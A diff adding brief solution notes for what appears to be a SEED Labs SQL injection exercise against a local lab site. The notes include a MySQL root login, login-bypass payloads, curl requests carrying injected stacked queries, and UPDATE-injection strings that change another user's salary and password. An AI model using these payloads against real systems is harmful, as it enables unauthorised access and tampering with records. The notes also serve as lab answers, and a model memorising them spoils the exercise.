@@ -1,0 +1,44 @@
+1. open terminal from /var/www/SQLInjection
+2. sudo service apache2 start
+3. sudo service apache2 status
+
+Task-1:
+1. mysql -u root -pseedubuntu
+2. use Users;
+3. show tables;
+4. select * from credential where name='Alice' \G;
+
+
+Task-2:
+
+--2.1--
+1. admin'#
+--2.2--
+2. curl 'http://www.seedlabsqlinjection.com/unsafe_home.php?username=Alice%27%20%23'
+--2.3--
+3. in unsafe_home.php file change query to multi_query then 
+Alice'; update credential set nickname='hacked_alice' where name='Alice'; # from credential where name='Samy'; #
+
+terminal: curl 'http://www.seedlabsqlinjection.com/unsafe_home.php?username=Alice%27%3B+update+credential+set+nickname%3D%27hacked_alice%27+where+name%3D%27Alice%27%3B+%23+from+credential+where+name%3D%27Samy%27%3B%23&Password='
+
+
+Task-3:
+login then edit profile section, in nickname section
+--3.1--
+1. ', salary='900000
+2. ', salary='1' where name="boby" #
+3. ', password=sha1('hacked') where name="boby"; #
+
+
+
+
+
+
+
+
+
+
+
+
+
+
